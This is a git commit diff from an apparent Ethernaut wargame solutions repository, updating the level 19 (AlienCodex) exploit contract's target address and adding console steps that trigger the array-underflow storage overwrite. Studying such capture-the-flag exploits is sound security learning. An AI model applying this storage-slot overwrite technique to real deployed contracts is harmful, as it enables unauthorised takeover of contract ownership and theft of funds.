4178e260f8892c61872a866ab0416afedc1d6f95
merlincdj <377730858@qq.com>
2021-12-20 17:20:52 +0800

    Update level 19

--- contracts/AlienCodexHack.sol
+++ contracts/AlienCodexHack.sol
@@ -6,7 +6,7 @@ interface IAlienCodex {
 }
 
 contract AlienCodexHack {
-    IAlienCodex public alienCodex = IAlienCodex(0xbDcABAFc89CeBE36530b258a2335713dFC5a4E54);
+    IAlienCodex public alienCodex = IAlienCodex(0x89BdDCaB01Fcc53e0D9fD4dc9CbFB8fD0f53D9B7);
 
     function attack() public {
         uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
--- levels/19_AlienCodex.md
+++ levels/19_AlienCodex.md
@@ -1,3 +1,8 @@
+```javascript
+await contract.make_contact()
+await contract.retract()
+```
+
 ```shell
 # Reference: https://cyanwingsbird.blog/solidity/ethernaut/19-alien-codex/
 truffle migrate --network rinkeby --f 19 --to 19
